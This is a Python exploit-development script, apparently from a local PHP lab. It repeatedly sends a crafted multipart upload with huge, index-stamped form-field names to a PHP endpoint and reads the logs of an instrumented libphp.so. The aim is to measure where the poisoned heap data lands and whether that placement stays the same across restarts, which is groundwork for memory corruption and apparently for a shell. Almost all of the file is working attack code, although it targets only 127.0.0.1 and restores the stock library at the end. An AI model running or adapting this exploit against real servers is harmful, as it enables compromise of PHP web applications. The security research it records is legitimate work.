#!/usr/bin/env python3
"""oom59: ADDRESS CONTROL probe — where does the poison land, and is it stable?

Instrument now prints slot addr (at=), table base (arData=), and bucket hash (h=).
Poison cells are STAMPED: each 16-byte cell carries its index in hex ASCII
(bytes '0'-'9','a'-'f', value = index mod 16 per position) so the W2 dump maps
uploaded data -> slot address directly.

Fires the attack N times, records (arData, slot-3956 addr, v0, h) per fire,
checks repeatability within run and across an apache restart.
"""
import re
import subprocess
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
NAMELEN = 3064
LIB = "/usr/lib/apache2/modules/libphp.so"
PHPLAB = "/Users/vlad/Projects/queue/php2shell-lab"
HEXD = b"0123456789abcdef"


def sh(cmd, timeout=25, retries=2):
    for _ in range(retries + 1):
        try:
            r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                               capture_output=True, timeout=timeout)
            return (r.stdout.decode("latin1") + r.stderr.decode("latin1")[:150]).strip()
        except subprocess.TimeoutExpired:
            time.sleep(1)
    return "<<EXEC TIMEOUT>>"


def dcp(src, dst):
    return subprocess.run(["docker", "cp", src, dst], capture_output=True).returncode


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (NAMELEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n, stamp_offset):
    """Cells stamped with consecutive indices starting at stamp_offset.
    Keeps the PROVEN geometry: ~163840-byte name (10237 cells of 16B)."""
    idx = stamp_offset
    body = bytearray()
    for _ in range(10237):
        stamp = bytes([HEXD[(idx >> (4 * (5 - k))) & 0xF] for k in range(6)])
        cell = stamp + b"z" * 10  # 6-digit stamp + filler = 16 bytes
        body += cell
        idx += 1
    nm = b"q" + bytes(body) + (b"%06d" % n)   # ~163840+7 bytes, DO NOT truncate
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(k1=2044, prep=3, stamp_base=0):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n, stamp_base + n * 10237) for n in range(prep)]
    ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def http(path, body=None, ctype=None, timeout=30):
    req = urllib.request.Request(LAB + path, data=body)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("latin1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("latin1", "replace")[:120]
    except Exception as e:
        return type(e).__name__, str(e)[:120]


def logs_tail(n=600):
    r = subprocess.run(["docker", "logs", "--tail", str(n), "php_vuln"],
                       capture_output=True, timeout=90)
    return (r.stdout + r.stderr).decode("latin1", "replace")


def parse_w2(logs):
    out = []
    for m in re.finditer(
            r"W2 dtorH? slot=(\d+)/(\d+) at=0x([0-9a-f]+) arData=0x([0-9a-f]+) "
            r"type=(\d+) v0=([0-9a-f]+) k=([0-9a-f]+) h=([0-9a-f]+)", logs):
        out.append({
            "slot": int(m.group(1)), "nused": int(m.group(2)),
            "at": int(m.group(3), 16), "arData": int(m.group(4), 16),
            "type": int(m.group(5)), "v0": m.group(6), "k": m.group(7),
            "h": m.group(8),
        })
    return out


def decode_stamp(v0hex):
    """v0 (16 bytes hex, little-endian qword pairs) -> first 6 bytes raw."""
    try:
        raw = bytes.fromhex(v0hex)[::-1]  # v0 printed as single little-endian u64
    except ValueError:
        return "?"
    return raw[:6].decode("latin1", "replace")


def fire_once(att, tag):
    logs0 = logs_tail()
    code, _ = http("/oom_mod.php", att, "multipart/form-data; boundary=BOUND", 40)
    time.sleep(1.5)
    logs1 = logs_tail(900)
    new_logs = logs1[len(logs0):] if logs1.startswith(logs0[:200]) else logs1
    hits = [h for h in parse_w2(new_logs)
            if h["v0"].startswith("08080808") or h["type"] == 8]
    stamped = [h for h in hits if re.match(r"^[0-9a-fz]", decode_stamp(h["v0"]))]
    print("  %s: http=%s poison-hits=%d" % (tag, code, len(hits)), flush=True)
    for h in hits[:3]:
        print("    slot=%d at=0x%x arData=0x%x type=%d h=%s stamp=%s"
              % (h["slot"], h["at"], h["arData"], h["type"], h["h"][:8],
                 decode_stamp(h["v0"])), flush=True)
    return hits


def main():
    print("=== [0] lab env + swap w2 instrument ===", flush=True)
    dcp(PHPLAB + "/oomlab.ini", "php_vuln:/usr/local/etc/php/conf.d/30-oomlab.ini")
    sh("grep -q PHPRC /etc/apache2/envvars || echo 'export PHPRC=/usr/local/etc/php/conf.d/30-oomlab.ini' >> /etc/apache2/envvars")
    sh("printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf")
    dcp(PHPLAB + "/libphp.so.w2", "php_vuln:" + LIB)
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    probe = "?"
    for _ in range(20):
        time.sleep(1.5)
        c, probe = http("/oom_sapi.php", timeout=5)
        if c == 200:
            break
    print("[ini]", probe, flush=True)
    if "lim=20600000" not in probe:
        print("[ABORT]", flush=True)
        return

    att = build_attack()
    print("[attack body]", len(att), "bytes; poison name ~163849 bytes", flush=True)

    print("=== [1] 5 fires, same child ===", flush=True)
    run1 = []
    for i in range(5):
        run1 += fire_once(att, "fire%d" % i)

    print("=== [2] restart apache, 3 more fires ===", flush=True)
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(15):
        time.sleep(1.5)
        c, _ = http("/oom_sapi.php", timeout=5)
        if c == 200:
            break
    run2 = []
    for i in range(3):
        run2 += fire_once(att, "restart-fire%d" % i)

    print("=== [3] analysis ===", flush=True)
    def summarize(hits, label):
        if not hits:
            print(label, "NO HITS", flush=True)
            return
        ardatas = sorted({h["arData"] for h in hits})
        ats = sorted({h["at"] for h in hits})
        print("%s: hits=%d distinct_arData=%d distinct_at=%d" %
              (label, len(hits), len(ardatas), len(ats)), flush=True)
        print("  arData set:", ["0x%x" % a for a in ardatas[:6]], flush=True)
        print("  slot addr set:", ["0x%x" % a for a in ats[:6]], flush=True)
        if len(ardatas) == 1:
            print("  >> arData IDENTICAL across fires in this group", flush=True)
    summarize(run1, "run1(same-child)")
    summarize(run2, "run2(post-restart)")

    all_hits = run1 + run2
    if all_hits:
        types = sorted({h["type"] for h in all_hits})
        slots = sorted({h["slot"] for h in all_hits})
        print("[types seen]", types, "[slots]", slots, flush=True)

    print("=== [4] restore stock ===", flush=True)
    sh("cp /tmp/libphp.so.stock %s" % LIB, 20)
    sh("rm -f /usr/local/etc/php/conf.d/30-oomlab.ini /etc/apache2/conf-enabled/oomcore.conf /tmp/core*")
    sh("sed -i '/PHPRC/d' /etc/apache2/envvars")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(15):
        time.sleep(1.5)
        c, probe = http("/oom_sapi.php", timeout=5)
        if c == 200:
            break
    print("[restored]", sh("md5sum %s | cut -c1-8" % LIB, 15), probe, flush=True)


if __name__ == "__main__":
    main()
